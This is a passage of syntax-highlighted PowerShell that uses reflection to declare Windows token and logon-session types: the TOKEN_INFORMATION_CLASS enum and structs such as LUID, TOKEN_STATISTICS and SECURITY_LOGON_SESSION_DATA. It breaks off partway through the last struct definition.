    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenPrimaryGroup'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 5<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenDefaultDacl'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 6<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenSource'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 7<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenType'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 8<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenImpersonationLevel'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 9<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenStatistics'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 10<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenRestrictedSids'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 11<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenSessionId'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 12<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenGroupsAndPrivileges'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 13<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenSessionReference'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 14<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenSandBoxInert'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 15<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenAuditPolicy'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 16<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenOrigin'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 17<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenElevationType'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 18<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenLinkedToken'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 19<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenElevation'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 20<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenHasRestrictions'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 21<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenAccessInformation'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 22<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenVirtualizationAllowed'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 23<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenVirtualizationEnabled'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 24<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenIntegrityLevel'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 25<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenUIAccess'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 26<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenMandatoryPolicy'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 27<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenLogonSid'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 28<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenIsAppContainer'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 29<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenCapabilities'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 30<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenAppContainerSid'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 31<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenAppContainerNumber'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 32<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenUserClaimAttributes'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 33<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenDeviceClaimAttributes'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 34<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenRestrictedUserClaimAttributes'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 35<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenRestrictedDeviceClaimAttributes'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 36<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenDeviceGroups'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 37<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenRestrictedDeviceGroups'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 38<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenSecurityAttributes'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 39<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'TokenIsRestricted'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 40<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineLiteral<span class="token punctuation">(</span><span class="token string">'MaxTokenInfoClass'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span> 41<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TOKEN_INFORMATION_CLASS</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#STRUCTs</span>
    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>
    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'LARGE_INTEGER'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">,</span> 8<span class="token punctuation">)</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'LowPart'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'HighPart'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$LARGE_INTEGER</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#Struct LUID</span>
    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>
    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'LUID'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">,</span> 8<span class="token punctuation">)</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'LowPart'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'HighPart'</span><span class="token punctuation">,</span> <span class="token namespace">[Int32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$LUID</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#Struct TOKEN_STATISTICS</span>
    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>
    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'TOKEN_STATISTICS'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">)</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'TokenId'</span><span class="token punctuation">,</span> <span class="token variable">$LUID</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'AuthenticationId'</span><span class="token punctuation">,</span> <span class="token variable">$LUID</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'ExpirationTime'</span><span class="token punctuation">,</span> <span class="token variable">$LARGE_INTEGER</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'TokenType'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'ImpersonationLevel'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'DynamicCharged'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'DynamicAvailable'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'GroupCount'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'PrivilegeCount'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'ModifiedId'</span><span class="token punctuation">,</span> <span class="token variable">$LUID</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TOKEN_STATISTICS</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#Struct LSA_UNICODE_STRING</span>
    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>
    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'LSA_UNICODE_STRING'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">)</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Length'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt16]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'MaximumLength'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt16]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Buffer'</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$LSA_UNICODE_STRING</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#Struct LSA_LAST_INTER_LOGON_INFO</span>
    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>
    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'LSA_LAST_INTER_LOGON_INFO'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">)</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'LastSuccessfulLogon'</span><span class="token punctuation">,</span> <span class="token variable">$LARGE_INTEGER</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'LastFailedLogon'</span><span class="token punctuation">,</span> <span class="token variable">$LARGE_INTEGER</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'FailedAttemptCountSinceLastSuccessfulLogon'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$LSA_LAST_INTER_LOGON_INFO</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#Struct SECURITY_LOGON_SESSION_DATA</span>
    <span class="token variable">$Attributes</span> = <span class="token string">'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'</span>
    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'SECURITY_LOGON_SESSION_DATA'</span><span class="token punctuation">,</span> <span class="token variable">$Attributes</span><span class="token punctuation">,</span> <span class="token namespace">[System.ValueType]</span><span class="token punctuation">)</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Size'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'LoginID'</span><span class="token punctuation">,</span> <span class="token variable">$LUID</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Username'</span><span class="token punctuation">,</span> <span class="token variable">$LSA_UNICODE_STRING</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'LoginDomain'</span><span class="token punctuation">,</span> <span class="token variable">$LSA_UNICODE_STRING</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'AuthenticationPackage'</span><span class="token punctuation">,</span> <span class="token variable">$LSA_UNICODE_STRING</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'LogonType'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Session'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Sid'</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'LoginTime'</span><span class="token punctuation">,</span> <span class="token variable">$LARGE_INTEGER</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'LoginServer'</span><span class="token punctuation">,</span> <span class="token variable">$LSA_UNICODE_STRING</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'DnsDomainName'</span><span class="token punctuation">,</span> <span class="token variable">$LSA_UNICODE_STRING</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'Upn'</span><span class="token punctuation">,</span> <span class="token variable">$LSA_UNICODE_STRING</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'UserFlags'</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'LastLogonInfo'</span><span class="token punctuation">,</span> <span class="token variable">$LSA_LAST_INTER_LOGON_INFO</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'LogonScript'</span><span class="token punctuation">,</span> <span class="token variable">$LSA_UNICODE_STRING</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'ProfilePath'</span><span class="token punctuation">,</span> <span class="token variable">$LSA_UNICODE_STRING</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'HomeDirectory'</span><span class="token punctuation">,</span> <span class="token variable">$LSA_UNICODE_STRING</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'HomeDirectoryDrive'</span><span class="token punctuation">,</span> <span class="token variable">$LSA_UNICODE_STRING</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'LogoffTime'</span><span class="token punctuation">,</span> <span class="token variable">$LARGE_INTEGER</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'KickOffTime'</span><span class="token punctuation">,</span> <span class="token variable">$LARGE_INTEGER</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
    <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineField<span class="token punctuation">(</span><span class="token string">'PasswordLastSet'</span><span class="token punctuation">,</span> <span class="token variable">$LARGE_INTEGER</span><span class="token punctuation">,</span> <span class="token string">'Public'</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
